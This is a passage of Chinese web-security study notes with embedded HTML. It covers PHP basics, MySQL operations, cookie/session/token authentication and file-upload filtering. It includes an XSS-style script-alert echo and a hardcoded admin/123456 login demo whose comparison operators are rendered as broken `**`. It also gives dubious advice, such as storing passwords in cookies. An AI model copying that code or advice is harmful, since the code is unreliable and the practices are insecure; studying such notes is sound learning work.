class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span>  <span class=\"string\">&#x27;函数名为：&#x27;</span> . <span class=\"keyword\">__METHOD__</span> ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">test</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">以上实例输出结果为：</span><br><span class=\"line\"></span><br><span class=\"line\">函数名为：test</span><br><span class=\"line\"><span class=\"keyword\">__NAMESPACE__</span></span><br><span class=\"line\">当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP <span class=\"number\">5.3</span>.<span class=\"number\">0</span> 新增）。</span><br><span class=\"line\"></span><br><span class=\"line\">实例:</span><br><span class=\"line\"></span><br><span class=\"line\">实例</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">MyProject</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&#x27;命名空间为：&quot;&#x27;</span>, <span class=\"keyword\">__NAMESPACE__</span>, <span class=\"string\">&#x27;&quot;&#x27;</span>; <span class=\"comment\">// 输出 &quot;MyProject&quot;</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">以上实例输出结果为：</span><br><span class=\"line\"></span><br><span class=\"line\">命名空间为：<span class=\"string\">&quot;MyProject&quot;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"PHP-命名空间（namespqce）\">PHP 命名空间（namespqce）</h5>\n<ul>\n<li>PHP 命名空间(namespace)是在 PHP 5.3 中加入的，目的是解决重名问题，PHP 中不允许两个函数或者类出现相同的名字，否则会产生一个致命的错误。</li>\n<li>PHP 命名空间可以解决以下两类问题：\n<ul>\n<li>用户编写的代码与 PHP 内部的类/函数/常量或第三方类/函数/常量之间的名字冲突。</li>\n<li>为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性。</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"PHP-面向对象\">PHP 面向对象</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Site &#123;</span><br><span class=\"line\">  /* 成员变量 */</span><br><span class=\"line\">  var $url;</span><br><span class=\"line\">  var $title;</span><br><span class=\"line\">  </span><br><span class=\"line\">  /* 成员函数 */</span><br><span class=\"line\">  function setUrl($par)&#123;</span><br><span class=\"line\">     $this-&gt;url = $par;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  function getUrl()&#123;</span><br><span class=\"line\">     echo $this-&gt;url . PHP_EOL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  function setTitle($par)&#123;</span><br><span class=\"line\">     $this-&gt;title = $par;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  function getTitle()&#123;</span><br><span class=\"line\">     echo $this-&gt;title . PHP_EOL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$runoob = new Site;</span><br><span class=\"line\">$taobao = new Site;</span><br><span class=\"line\">$google = new Site;</span><br><span class=\"line\"></span><br><span class=\"line\">// 调用成员函数，设置标题和URL</span><br><span class=\"line\">$runoob-&gt;setTitle( &quot;菜鸟教程&quot; );</span><br><span class=\"line\">$taobao-&gt;setTitle( &quot;淘宝&quot; );</span><br><span class=\"line\">$google-&gt;setTitle( &quot;Google 搜索&quot; );</span><br><span class=\"line\"></span><br><span class=\"line\">$runoob-&gt;setUrl( &#x27;www.runoob.com&#x27; );</span><br><span class=\"line\">$taobao-&gt;setUrl( &#x27;www.taobao.com&#x27; );</span><br><span class=\"line\">$google-&gt;setUrl( &#x27;www.google.com&#x27; );</span><br><span class=\"line\"></span><br><span class=\"line\">// 调用成员函数，获取标题和URL</span><br><span class=\"line\">$runoob-&gt;getTitle();</span><br><span class=\"line\">$taobao-&gt;getTitle();</span><br><span class=\"line\">$google-&gt;getTitle();</span><br><span class=\"line\"></span><br><span class=\"line\">$runoob-&gt;getUrl();</span><br><span class=\"line\">$taobao-&gt;getUrl();</span><br><span class=\"line\">$google-&gt;getUrl();</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\">  &lt;?php</span><br><span class=\"line\">class Site &#123;</span><br><span class=\"line\">  /* 成员变量 */</span><br><span class=\"line\">  var $url;</span><br><span class=\"line\">  var $title;</span><br><span class=\"line\"></span><br><span class=\"line\">  function __construct( $par1, $par2 ) &#123;</span><br><span class=\"line\">    $this-&gt;url = $par1;</span><br><span class=\"line\">    $this-&gt;title = $par2;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  /* 成员函数 */</span><br><span class=\"line\">  function setUrl($par)&#123;</span><br><span class=\"line\">     $this-&gt;url = $par;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  function getUrl()&#123;</span><br><span class=\"line\">     echo $this-&gt;url . PHP_EOL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  function setTitle($par)&#123;</span><br><span class=\"line\">     $this-&gt;title = $par;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  function getTitle()&#123;</span><br><span class=\"line\">     echo $this-&gt;title . PHP_EOL;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$runoob = new Site(&#x27;www.runoob.com&#x27;, &#x27;菜鸟教程&#x27;);</span><br><span class=\"line\">$taobao = new Site(&#x27;www.taobao.com&#x27;, &#x27;淘宝&#x27;);</span><br><span class=\"line\">$google = new Site(&#x27;www.google.com&#x27;, &#x27;Google 搜索&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">// 调用成员函数，获取标题和URL</span><br><span class=\"line\">$runoob-&gt;getTitle();</span><br><span class=\"line\">$taobao-&gt;getTitle();</span><br><span class=\"line\">$google-&gt;getTitle();</span><br><span class=\"line\"></span><br><span class=\"line\">$runoob-&gt;getUrl();</span><br><span class=\"line\">$taobao-&gt;getUrl();</span><br><span class=\"line\">$google-&gt;getUrl();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"二、PHP-留言板功能-超全局变量-数据库操作\">二、PHP 留言板功能&amp;超全局变量&amp;数据库操作</h4>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/9CE5BD90E687BB%B6.png\" alt=\"\"></p>\n<ul>\n<li>开发环境：\n<ul>\n<li>phpstrom：专业 php 开发 ide</li>\n<li>phpstudy：Apache MYSQL 环境</li>\n<li>Navicat：全能数据库管理工具</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"数据库导入-mysql-架构-库表列\">数据库导入-mysql 架构&amp;库表列</h5>\n<ul>\n<li>1.数据库名，数据库表名，数据库列名</li>\n<li>2.数据库数据，格式类型，长度，键等</li>\n</ul>\n<h5 id=\"数据库操作-mysql-函数-增删改查\">数据库操作-mysql 函数&amp;增删改查</h5>\n<ul>\n<li>PHP 函数：连接，选择，执行，结果，关闭等</li>\n<li>参考：<a href=\"https://www.runoob.com/php/php-ref-mysqli.html\">https://www.runoob.com/php/php-ref-mysqli.html</a></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">常用：</span><br><span class=\"line\">mysqli_connect() 打开一个到MySQL的新的连接。</span><br><span class=\"line\">mysqli_select_db() 更改连接的默认数据库。</span><br><span class=\"line\">mysqli_query() 执行某个针对数据库的查询。</span><br><span class=\"line\">mysqli_fetch_row() 从结果集中取得一行，并作为枚举数组返回。</span><br><span class=\"line\">mysqli_close() 关闭先前打开的数据库连接。</span><br><span class=\"line\">MYSQL增删改查：</span><br><span class=\"line\">查：select * from 表名 where 列名=&#x27;条件&#x27;;</span><br><span class=\"line\">增：insert into 表名(`列名1`, `列名2`) value(&#x27;列1值1&#x27;, &#x27;列2值2&#x27;);</span><br><span class=\"line\">删：delete from 表名 where 列名 = &#x27;条件&#x27;;</span><br><span class=\"line\">改：update 表名 set 列名 = 数据 where 列名 = &#x27;条件&#x27;;</span><br></pre></td></tr></table></figure>\n<h5 id=\"数据库接受输出-html-混编-超全局变量\">数据库接受输出-html 混编&amp;超全局变量</h5>\n<ul>\n<li>1.html 混编：使 HTML（js）在 php 语言运行\n<ul>\n<li><code>&lt;?php echo '&lt;script&gt;alert('x');&lt;/script&gt;' ?&gt;</code></li>\n</ul>\n</li>\n<li>2.超全变量：\n<ul>\n<li><a href=\"https://www.w3school.com.cn/php/php_superglobals.asp\">https://www.w3school.com.cn/php/php_superglobals.asp</a></li>\n<li><a href=\"https://www.php.net/manual/zh/language.variables.superglobals.php\">https://www.php.net/manual/zh/language.variables.superglobals.php</a></li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$GLOBALS</span> 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量</span><br><span class=\"line\"><span class=\"variable\">$_SERVER</span>：这种超全局变量保存关于报头、路径和脚本位置的信息</span><br><span class=\"line\"><span class=\"variable\">$_REQUEST</span>：<span class=\"variable\">$_REQUEST </span>用于收集 HTML 表单提交的数据</span><br><span class=\"line\"><span class=\"variable\">$_POST</span>：广泛用于收集提交method=<span class=\"string\">&quot;post&quot;</span> 的HTML表单后的表单数据</span><br><span class=\"line\"><span class=\"variable\">$_GET</span>：收集URL中的发送的数据。也可用于收集提交HTML表单数据(method=<span class=\"string\">&quot;get&quot;</span>) <span class=\"variable\">$_FILES</span>：文件上传且处理包含通过HTTP POST方法上传给当前脚本的文件内容</span><br><span class=\"line\"><span class=\"variable\">$_ENV</span>：是一个包含服务器端环境变量的数组</span><br><span class=\"line\"><span class=\"variable\">$_COOKIE</span>：是一个关联数组，包含通过cookie传递给当前脚本的内容</span><br><span class=\"line\"><span class=\"variable\">$_SESSION</span>：是一个关联数组，包含当前脚本中的所有session内容</span><br></pre></td></tr></table></figure>\n<h5 id=\"第三方插件引用-js-传参-函数对象调用\">第三方插件引用-js 传参&amp;函数对象调用</h5>\n<ul>\n<li>引用：<code>&lt;script src = '../xxx.js&gt;&lt;/script&gt;'</code></li>\n<li>函数对象调用</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    value : <span class=\"number\">0</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">increment : <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">inc</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        this.value += typeof inc === <span class=\"string\">&#x27;number&#x27;</span> ? inc :<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//设置inc且为数字时 value=inc 反之 value=1</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">obj.<span class=\"title function_ invoke__\">increment</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">console.<span class=\"title function_ invoke__\">log</span>(obj.value); <span class=\"comment\">//1</span></span><br><span class=\"line\"></span><br><span class=\"line\">obj.<span class=\"title function_ invoke__\">increment</span>(<span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">console.<span class=\"title function_ invoke__\">log</span>(obj.value); <span class=\"comment\">//2</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"三、PHP-应用-后台模块-Session-Cookie-Token-身份验证-唯一性\">三、PHP 应用&amp;后台模块&amp;Session&amp;Cookie&amp;Token&amp;身份验证&amp;唯一性</h4>\n<h5 id=\"身份验证-cookie-使用\">身份验证-cookie 使用</h5>\n<ul>\n<li>\n<p>生成 cookie 的原理过程：见图</p>\n<ul>\n<li>1.客户端向服务器发送 HTTP 请求</li>\n<li>2.服务器检查请求头中是否包含 cookie 信息</li>\n<li>3.如果请求头中包含 cookie 信息，则服务器使用该 cookie 来识别客户端，否则服务器将生成一个新的 cookie</li>\n<li>4.服务器在响应头中设置 cookie 信息并将其发送回客户端</li>\n<li>5.客户端接收响应并将 cookie 保存在本地</li>\n<li>6.当客户端发送下一次 HTTP 请求时，它会将 cookie 信息附加到请求头中</li>\n<li>7.服务器收到请求并检查 cookie 的有效性</li>\n<li>8.如果 cookie 有效，则服务器响应请求。否则，服务器可能会要求客户端重新登录</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">setcookie</span>()  <span class=\"comment\">#设置一个cookie并发送到客户端浏览器</span></span><br><span class=\"line\"><span class=\"keyword\">unset</span>()      <span class=\"comment\">#用于删除指定的cookie</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/9CE5BD90E687BB%B6-1753684957852-4.png\" alt=\"\"></p>\n<h5 id=\"身份验证-Session-使用\">身份验证-Session 使用</h5>\n<ul>\n<li>1、客户端向服务器发送 HTTP 请求</li>\n<li>2、服务器为客户端生成一个唯一的 session ID，并将其存储在服务器端的存储器中（如文件、数据库等）</li>\n<li>3、服务器将生成的 session ID 作为一个 cookie 发送给客户端。</li>\n<li>4、客户端将 session ID 保存为一个 cookie，通常是在本地浏览器中存储</li>\n<li>5、当客户端在发送下一次 HTTP 请求时，它会将该 cookie 信息附加到请求头中，以便服务器可以通过该 session ID 来识别客户端</li>\n<li>6、服务器使用 session ID 来检索存储在服务器端存储器中的与该客户端相关的 session 数据，从而在客户端和服务器之间共享数据。</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>()    <span class=\"comment\">#启动会话，用于开始或恢复一个已经存在的会话</span></span><br><span class=\"line\"><span class=\"variable\">$_SESSON</span>           <span class=\"comment\">#用于存储和访问当前会话中的所有数据</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_destroy</span>()  <span class=\"comment\">#销毁当前会话中的所有数据</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_unset</span>()    <span class=\"comment\">#释放当前会话的所有变量</span></span><br><span class=\"line\">Session存储路径：php.ini中session.save_path设置路径</span><br></pre></td></tr></table></figure>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/9CE5BD90E687BB%B6-1753684981255-6.png\" alt=\"\"></p>\n<h5 id=\"唯一性判断-Token-使用\">唯一性判断-Token 使用</h5>\n<ul>\n<li>1、生成 Token 并将其存储在 Session</li>\n<li>2、生成 Token 并将其绑定在 Cookie 触发</li>\n<li>3、尝试登录表单中带入 Token 验证逻辑</li>\n<li>4、思考 Token 安全特性</li>\n</ul>\n<h5 id=\"具体安全知识点\">具体安全知识点</h5>\n<h6 id=\"Cookie-和-Session\">Cookie 和 Session</h6>\n<ul>\n<li>\n<p>Cookie 和 Session 都是用来在 Web 应用程序中跟踪用户状态的机制</p>\n</li>\n<li>\n<p>1.存储位置不同：</p>\n<ul>\n<li>Cookie 是存储在客户端（浏览器）上的，而 Session 是存储在服务器端的。</li>\n</ul>\n</li>\n<li>\n<p>2.安全性不同：</p>\n<ul>\n<li>Cookie 存储在客户端上，可能会被黑客利用窃取信息，而 Session 存储在服务器上，更加安全。</li>\n</ul>\n</li>\n<li>\n<p>3.存储容量不同：</p>\n<ul>\n<li>Cookie 的存储容量有限，一般为 4KB，而 Session 的存储容量理论上没有限制，取决于服务器的硬件和配置。</li>\n</ul>\n</li>\n<li>\n<p>4.生命周期不同：</p>\n<ul>\n<li>Cookie 可以设置过期时间，即便关闭浏览器或者重新打开电脑，Cookie 仍然存在，直到过期或者被删除。而 Session 一般默认在浏览器关闭后就会过期。</li>\n</ul>\n</li>\n<li>\n<p>5.访问方式不同：</p>\n<ul>\n<li>Cookie 可以通过 JavaScript 访问，而 Session 只能在服务器端进行访问</li>\n</ul>\n</li>\n<li>\n<p>6.使用场景不同：</p>\n<ul>\n<li>Cookie 一般用于存储小型的数据，如用户的用户名和密码等信息。而 Session 一般用于存储大型的数据，如购物车、登录状态等信息</li>\n</ul>\n</li>\n<li>\n<p>总之，Cookie 和 Session 都有各自的优缺点，选择使用哪一种方式，取决于具体的应用场景和需求。一般来说，如果需要存储敏感信息或者数据较大，建议使用 Session；如果只需要存储少量的数据，并且需要在客户端进行访问，可以选择使用 Cookie</p>\n</li>\n</ul>\n<h6 id=\"Token\">Token</h6>\n<ul>\n<li>在 Web 应用程序中，使用 token 和不使用 token 的主要差异在于身份验证和安全性。</li>\n<li>1.身份验证：\n<ul>\n<li>采用 token 机制的 Web 应用程序，用户在登录成功后会收到一个 token，这个 token 可以在每次请求时发送给服务器进行身份验证。而不采用 token 机制的 Web 应用程序，一般会使用 session 机制来保存用户登录状态，服务器会在用户登录成功后创建一个 session，之后的每个请求都需要在 HTTP 头中附带这个 session ID，以便服务器能够验证用户身份。</li>\n</ul>\n</li>\n<li>2.安全性：\n<ul>\n<li>采用 token 机制的 Web 应用程序，在服务器上不会存储用户的登录状态，只需要存储 token 即可。因此，即使 token 被盗取，黑客也无法获得用户的密码或者其他敏感信息。而不采用 token 机制的 Web 应用程序，一般会在服务器上存储用户的登录状态，因此如果服务器被黑客攻击，黑客可能会获得用户的敏感信息。</li>\n</ul>\n</li>\n<li>3.跨域访问：\n<ul>\n<li>采用 token 机制的 Web 应用程序，在跨域访问时，可以使用 HTTP 头中的 Authorization 字段来传递 token 信息，方便实现跨域访问。而不采用 token 机制的 Web 应用程序，在跨域访问时，需使用 cookie 或 session 来传递用户身份信息，比较麻烦。</li>\n</ul>\n</li>\n<li>总之，采用 token 机制可以提高 Web 应用程序的安全性，并且方便实现跨域访问。不过，使用 token 机制也需要开发者自己来实现身份验证和 token 的生成和验证，相对来说比较复杂。而不采用 token 机制，使用 session 机制则相对简单，但是安全性相对较低。因此，具体采用哪种机制，需要根据实际情况进行权衡和选择。</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$token</span> = <span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;token&#x27;</span>] ?? <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$token</span> !== <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;token&#x27;</span>]) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// token不匹配，禁止访问</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&#x27;HTTP/1.1 403 Forbidden&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Access denied&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>]**<span class=\"string\">&#x27;admin&#x27;</span> &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]**<span class=\"string\">&#x27;123456&#x27;</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;登录成功!&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;你是管理员可以访问文件管理页面！&#x27;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;登录失败！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"四、PHP-应用-文件管理模块-显示上传-黑白名单类型过滤-访问控制\">四、PHP 应用&amp;文件管理模块&amp;显示上传&amp;黑白名单类型过滤&amp;访问控制</h4>\n<h5 id=\"文件管理模块-上传-过滤机制\">文件管理模块-上传-过滤机制</h5>\n<ul>\n<li>\n<p>1.无过滤机制</p>\n</li>\n<li>\n<p>2.黑名单过滤机制</p>\n</li>\n<li>\n<p>3.白名单过滤机制</p>\n</li>\n<li>\n<p>4.文件类型过滤机制</p>\n</li>\n<li>\n<p>$_FILES：PHP 中一个预定义的超全局变量，用于在上传文件时从客户端接收文件，并将其保存到服务器上。它是一个包含上传文件信息的数组，包括文件名、类型、大小、临时文件名等信息。</p>\n</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;表单值&quot;</span>][<span class=\"string\">&quot;name&quot;</span>] 获取上传文件原始名称</span><br><span class=\"line\"><span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;表单值&quot;</span>][<span class=\"string\">&quot;type&quot;</span>]获取上传文件MIME类型</span><br><span class=\"line\"><span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;表单值&quot;</span>][<span class=\"string\">&quot;size&quot;</span>] 获取上传文件字节单位大小</span><br><span class=\"line\"><span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;表单值&quot;</span>][<span class=\"string\">&quot;tmp_name&quot;</span>] 获取上传的临时副本文件名</span><br><span class=\"line\"><span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;表单值&quot;</span>][<span class=\"string\">&quot;error&quot;</span>] 获取上传时发生的错误代码</span><br><span class=\"line\"><span class=\"title function_ invoke__\">move_uploaded_file</span>() 将上传的文件移动到指定位置的函数</span><br></pre></td></tr></table></figure>\n<h5 id=\"文件管理模块-显示-过滤机制\">文件管理模块-显示-过滤机制</h5>\n<p>功能：显示 上传 下载 删除 编辑 包含等</p>\n<ul>\n<li>1.打开目录读取文件列表</li>\n<li>2.递归循环读取文件列表</li>\n<li>3.判断是文件还是文件夹</li>\n<li>4.PHP.INI 目录访问控制</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">is_dir</span>() 函数用于检查指定的路径是否是一个目录</span><br><span class=\"line\"><span class=\"title function_ invoke__\">opendir</span>() 函数用于打开指定的目录，返回句柄，用来读取目录中的文件和子目录</span><br><span class=\"line\"><span class=\"title function_ invoke__\">readdir</span>() 函数用于从打开的目录句柄中读取目录中的文件和子目录</span><br></pre></td></tr></table></figure>\n<ul>\n<li>open_basedir：PHP.INI 中的设置用来控制脚本程序访问目录（把：去掉就是控制在这个目录)</li>\n<li>过滤 切换目录负号：…/  …\\\n<ul>\n<li>“./”：代表目前所在的目录</li>\n<li>&quot; . ./&quot; 代表上一层目录</li>\n<li>“/”：代表根目录。</li>\n</ul>\n</li>\n<li><a href=\"https://blog.csdn.net/Young__Fan/article/details/80152501\">https://blog.csdn.net/Young__Fan/article/details/80152501</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_44567318/article/details/116863701\">https://blog.csdn.net/weixin_44567318/article/details/116863701</a></li>\n</ul>\n<h4 id=\"五、PHP-应用-文件管理模块-包含-上传-遍历-写入-删除-下载-安全\">五、PHP 应用&amp;文件管理模块&amp;包含&amp;上传&amp;遍历&amp;写入&amp;删除&amp;下载&amp;安全</h4>\n<h5 id=\"PHP-文件操作安全\">PHP 文件操作安全</h5>\n<ul>\n<li>文件包含，文件上传，文件下载，文件删除，文件写入，文件遍历</li>\n</ul>\n<h5 id=\"文件包含\">文件包含</h5>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">include</span>()       <span class=\"comment\">#在错误发生后脚本继续执行</span></span><br><span class=\"line\"><span class=\"keyword\">require</span>()       <span class=\"comment\">#在错误发生后脚本停止执行</span></span><br><span class=\"line\"><span class=\"keyword\">include_once</span>()  <span class=\"comment\">#如果已经包含，则不再执行</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span>()  <span class=\"comment\">#如果已经包含，则不再执行</span></span><br></pre></td></tr></table></figure>\n<p>例：</p>\n<figure class=\"highlight 